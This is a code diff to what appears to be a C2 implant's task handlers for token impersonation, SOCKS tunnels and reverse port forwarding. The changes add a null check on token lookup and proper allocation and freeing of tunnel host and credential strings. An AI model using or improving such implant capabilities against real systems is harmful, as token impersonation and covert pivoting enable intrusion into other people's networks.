@@ -856,17 +856,24 @@ auto DECLFN Task::Token(
 
             break;
         }
-        case Action::Token::Impersonate: {            
+        case Action::Token::Impersonate: {
             ULONG TokenID = Self->Psr->Int32( Parser );
             KhDbg("Impersonating Token ID: %d", TokenID);
 
             TOKEN_NODE* TokenObj = Self->Tkn->GetByID( TokenID );
-            
+
+            if ( !TokenObj ) {
+                KhDbg("Token ID %d not found", TokenID);
+                Self->Pkg->Int32( Package, FALSE );
+                KhSetError( ERROR_NOT_FOUND );
+                break;
+            }
+
             BOOL result = Self->Tkn->Use( TokenObj->Handle );
             KhDbg("Impersonate Result: %s", result ? "SUCCESS" : "FAILED");
-            
+
             Self->Pkg->Int32( Package, result );
-            
+
             break;
         }
         case Action::Token::Remove: {            
@@ -1064,9 +1071,9 @@ auto DECLFN Task::ProcessTunnel(
                     if ( Index != -1 ) {
                         Self->Tsp->Tunnels[Index].ChannelID = cid;
                         Self->Tsp->Tunnels[Index].Port      = 0;
-                        Self->Tsp->Tunnels[Index].Host      = "";
-                        Self->Tsp->Tunnels[Index].Username  = "";
-                        Self->Tsp->Tunnels[Index].Password  = ""; 
+                        Self->Tsp->Tunnels[Index].Host      = nullptr;
+                        Self->Tsp->Tunnels[Index].Username  = nullptr;
+                        Self->Tsp->Tunnels[Index].Password  = nullptr; 
                         Self->Tsp->Tunnels[Index].Socket    = SocketObj;  
                         Self->Tsp->Tunnels[Index].State     = TUNNEL_STATE_READY;
                         Self->Tsp->Tunnels[Index].Mode      = TUNNEL_MODE_SEND_TCP;                     
@@ -1324,6 +1331,22 @@ auto DECLFN Task::ProcessTunnel(
                 }
 
                 KhDbg("Closing Tunnel %d, TunnelTasksCount: %d", Self->Tsp->Tunnels[i].ChannelID, Self->Tsp->TunnelTasksCount);
+
+				// Free allocated strings before resetting the tunnel
+				if (Self->Tsp->Tunnels[i].Host && Self->Hp->CheckPtr(Self->Tsp->Tunnels[i].Host)) {
+					KhDbg("Freeing Host pointer");
+					hFree(Self->Tsp->Tunnels[i].Host);
+					Self->Tsp->Tunnels[i].Host = nullptr;
+				}
+				if (Self->Tsp->Tunnels[i].Username && Self->Hp->CheckPtr(Self->Tsp->Tunnels[i].Username)) {
+					hFree(Self->Tsp->Tunnels[i].Username);
+					Self->Tsp->Tunnels[i].Username = nullptr;
+				}
+				if (Self->Tsp->Tunnels[i].Password && Self->Hp->CheckPtr(Self->Tsp->Tunnels[i].Password)) {
+					hFree(Self->Tsp->Tunnels[i].Password);
+					Self->Tsp->Tunnels[i].Password = nullptr;
+				}
+
 				Self->Tsp->Tunnels[i].ChannelID  = 0;
                 Self->Tsp->Tunnels[i].State      = 0;
                 Self->Tsp->Tunnels[i].CloseTimer = 0;
@@ -1379,6 +1402,20 @@ auto DECLFN Task::Socks(
 
             KhDbg("index: %d", Index);
 
+            // Defensive: ensure any old allocations from this slot are freed before reuse
+            if (Self->Tsp->Tunnels[Index].Host && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Host)) {
+                hFree(Self->Tsp->Tunnels[Index].Host);
+                Self->Tsp->Tunnels[Index].Host = nullptr;
+            }
+            if (Self->Tsp->Tunnels[Index].Username && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Username)) {
+                hFree(Self->Tsp->Tunnels[Index].Username);
+                Self->Tsp->Tunnels[Index].Username = nullptr;
+            }
+            if (Self->Tsp->Tunnels[Index].Password && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Password)) {
+                hFree(Self->Tsp->Tunnels[Index].Password);
+                Self->Tsp->Tunnels[Index].Password = nullptr;
+            }
+
             WSAData WsaData;
             if ( Self->Ws2_32.WSAStartup( 514, &WsaData ) ) {
                 Self->Ws2_32.WSACleanup();
@@ -1404,11 +1441,18 @@ auto DECLFN Task::Socks(
 
                             INT32 Mode = 0;
 
+                            ULONG AddrLen = Str::LengthA(Address);
+                            CHAR* HostCopy = (CHAR*)hAlloc(AddrLen + 1);
+                            if (HostCopy) {
+                                Mem::Copy(HostCopy, Address, AddrLen);
+                                HostCopy[AddrLen] = '\0';
+                            }
+
                             Self->Tsp->Tunnels[Index].ChannelID = ChannelID;
-                            Self->Tsp->Tunnels[Index].Host      = Address;
+                            Self->Tsp->Tunnels[Index].Host      = HostCopy;
                             Self->Tsp->Tunnels[Index].Port      = Port;
-                            Self->Tsp->Tunnels[Index].Username  = "";
-                            Self->Tsp->Tunnels[Index].Password  = ""; 
+                            Self->Tsp->Tunnels[Index].Username  = nullptr;
+                            Self->Tsp->Tunnels[Index].Password  = nullptr; 
                             Self->Tsp->Tunnels[Index].Socket    = SocketObj;  
                             Self->Tsp->Tunnels[Index].State     = TUNNEL_STATE_CONNECT;
                             Self->Tsp->Tunnels[Index].Mode      = TUNNEL_MODE_SEND_TCP;                     
@@ -1569,6 +1613,20 @@ auto Task::RPortfwd(
 
     KhDbg("index: %d", Index);
 
+    // Defensive: ensure any old allocations from this slot are freed before reuse
+    if (Self->Tsp->Tunnels[Index].Host && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Host)) {
+        hFree(Self->Tsp->Tunnels[Index].Host);
+        Self->Tsp->Tunnels[Index].Host = nullptr;
+    }
+    if (Self->Tsp->Tunnels[Index].Username && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Username)) {
+        hFree(Self->Tsp->Tunnels[Index].Username);
+        Self->Tsp->Tunnels[Index].Username = nullptr;
+    }
+    if (Self->Tsp->Tunnels[Index].Password && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Password)) {
+        hFree(Self->Tsp->Tunnels[Index].Password);
+        Self->Tsp->Tunnels[Index].Password = nullptr;
+    }
+
     WSAData WsaData;
     if ( Self->Ws2_32.WSAStartup( 514, &WsaData ) ) {
         Self->Ws2_32.WSACleanup();
@@ -1591,9 +1649,9 @@ auto Task::RPortfwd(
                         
                     Self->Tsp->Tunnels[Index].ChannelID = ChannelID;
                     Self->Tsp->Tunnels[Index].Port      = Port;
-                    Self->Tsp->Tunnels[Index].Host      = "";
-                    Self->Tsp->Tunnels[Index].Username  = "";
-                    Self->Tsp->Tunnels[Index].Password  = ""; 
+                    Self->Tsp->Tunnels[Index].Host      = nullptr;
+                    Self->Tsp->Tunnels[Index].Username  = nullptr;
+                    Self->Tsp->Tunnels[Index].Password  = nullptr; 
                     Self->Tsp->Tunnels[Index].Socket    = SocketObj;  
                     Self->Tsp->Tunnels[Index].State     = TUNNEL_STATE_CONNECT;
                     Self->Tsp->Tunnels[Index].Mode      = TUNNEL_MODE_REVERSE_TCP;                     
